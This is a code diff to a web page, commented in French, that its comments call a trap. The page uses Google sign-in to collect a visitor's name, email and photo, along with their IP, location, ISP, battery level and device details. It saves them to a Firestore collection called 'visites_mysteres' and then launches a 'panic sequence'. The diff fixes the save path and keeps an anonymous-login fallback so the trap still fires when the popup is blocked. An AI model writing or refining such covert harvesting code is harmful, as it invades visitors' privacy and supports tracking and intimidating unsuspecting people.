@@ -212,6 +212,7 @@
         const googleProvider = new GoogleAuthProvider();
 
         const apiKey = ""; // La clé est fournie automatiquement par l'environnement
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
         
         // Stockage des vraies données Google
         let personalData = { nom: "", email: "", photo: "" };
@@ -428,7 +429,15 @@ Appareil: ${userData.os}, Navigateur: ${userData.navigateur}, Batterie: ${userDa
             const dev = getDetailedDeviceInfo();
 
             const data = { session_id: sessionId, nom: personalData.nom, email: personalData.email, photo_url: personalData.photo, ip: geoData.ip || "N/A", ville: geoData.city || "Inconnue", pays: geoData.country || "Inconnu", isp: geoData.organization || "Inconnu", batterie: batteryLevel + "%", os: dev.name, navigateur: dev.browser, cpu: cores, ram: ram, reseau: connType, date_clic: serverTimestamp() };
-            try { await addDoc(collection(db, "visites_mysteres"), data); } catch(e) {}
+            try { 
+                const user = auth.currentUser;
+                if (user) {
+                    // Sauvegarde dans le chemin strict et autorisé par Firebase
+                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'visites_mysteres'), data); 
+                }
+            } catch(e) {
+                console.error("Erreur de sauvegarde dans la base de données :", e);
+            }
             return { ...geoData, batteryLevel, dev, dateStr, sessionId, cores, ram, connType };
         }
 
@@ -557,14 +566,14 @@ Appareil: ${userData.os}, Navigateur: ${userData.navigateur}, Batterie: ${userDa
                 launchPanicSequence();
 
             } catch (error) {
-                console.error("Erreur d'authentification :", error);
+                console.error("Erreur d'authentification (Popup bloqué ou annulé) :", error);
                 
-                // Si ça échoue (popup bloqué, annulation...), on utilise l'authentification anonyme 
-                // pour que le piège fonctionne quand même avec de fausses données.
+                // Si ça échoue (popup bloqué par l'Aperçu, annulation...), on utilise l'authentification anonyme 
+                // pour que le piège fonctionne quand même, mais on l'indique explicitement dans la base de données.
                 try {
                     await signInAnonymously(auth);
-                    personalData.nom = "Utilisateur Anonyme";
-                    personalData.email = "Non détecté";
+                    personalData.nom = "Échec (Test en Aperçu ou Popup Bloqué)";
+                    personalData.email = "Anonyme";
                     launchPanicSequence();
                 } catch(e) {
                     errorBox.textContent = "Erreur système critique. Connexion impossible.";
